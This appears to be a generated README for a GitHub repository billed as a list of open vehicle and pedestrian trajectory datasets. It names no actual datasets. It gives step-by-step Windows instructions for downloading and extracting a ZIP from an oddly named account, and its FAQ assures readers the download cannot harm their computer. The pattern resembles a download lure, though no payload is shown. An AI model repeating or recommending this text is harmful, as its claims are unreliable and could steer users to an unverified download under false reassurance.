# 📍 awesome-trajectory-datasets - Find open traffic data for research

[![](https://img.shields.io/badge/Download_Dataset_List-Blue?style=for-the-badge)](https://github.com/unquestioning-forehanddrive560/awesome-trajectory-datasets)

This project provides a list of data collections. Researchers use these files to study how cars and people move on roads. You can access information about GPS coordinates, vehicle paths, and pedestrian walking patterns. This resource helps you start your traffic analysis projects.

## 📁 What is inside

This list contains links to many public data sources. These datasets include records from different cities and road conditions. You will find files that show where vehicles drive and how fast they move. Organizations release this data to support work in autonomous driving and city planning. Scientists use these records to build better road safety systems and improve traffic flow.

## 🛠️ Requirements

You need a computer with a Windows operating system. Most modern versions of Windows work well with these files. You need a web browser such as Chrome, Firefox, or Edge to download the materials. You also need a program like Excel or a text editor to view the contents of the datasets. Some files come in folders, so you need a tool to extract them. Windows includes a built-in tool for this task.

## 📥 How to get the files

Follow these steps to access the data on your Windows machine.

1. Visit the [official download page](https://github.com/unquestioning-forehanddrive560/awesome-trajectory-datasets) to see the full list of files.
2. Look for the green button marked "Code" on the right side of the screen.
3. Click this button and select the option that says "Download ZIP".
4. Wait for your browser to save the file to your computer.
5. Open your Downloads folder in Windows.
6. Right-click the file named awesome-trajectory-datasets-main.zip.
7. Choose "Extract All" from the menu.
8. Select a location on your computer to save the files.
9. Click "Extract" to finish the process.

You now have a folder on your computer with the full collection of datasets.

## 💡 How to use the datasets

Open the extracted folder. You will see a list of text or spreadsheet files inside. You can double-click any file to view it. If the file extension ends in .csv, your computer will likely open it in Excel or a similar program. These files contain rows and columns of data. Each row represents a specific moment in time. You will see columns for latitude, longitude, and timestamps. Use this information to map out paths. If you find a file format you do not recognize, try opening it with a basic notepad program. Most datasets use standard plain text, which makes them easy to read.

## 📂 Understanding the categories

The collection organizes data by topic to help you find what you need quickly.

### Autonomous Driving
These files contain information meant for training self-driving software. They show how cars react to obstacles on the road. You can use these files to teach computer models how to steer safely.

### Pedestrian Movement
These datasets focus on people walking. They record the behavior of individuals at crosswalks or in parks. Researchers find this data helpful for designing safer city streets.

### Traffic Research
These sets provide large counts of vehicle movement. They help experts understand general patterns in city congestion. Use these if you want to study peak hours or traffic jams.

## ⚡ Frequently asked questions

### Will this software harm my computer?
No. This repository provides data files. It does not install programs or change your settings. You simply download and view the information.

### Can I download just one file?
Yes. You do not need to download the whole list if you only need certain data. Browse the folder structure on the page and click the name of the file you want. Click the "Raw" button to view or save only that specific file.

### What should I do if the file does not open?
Check your file associations. Make sure you have a spreadsheet viewer or a text editor installed. If you cannot open a file, try right-clicking it, selecting "Open with," and choosing Notepad or Excel from the list.

### Can I contribute my own data?
Yes. If you have a dataset, you can suggest it for the list. You will need a GitHub account to submit your contribution. Follow the guidelines in the main document to ensure your data fits the format of the other files.
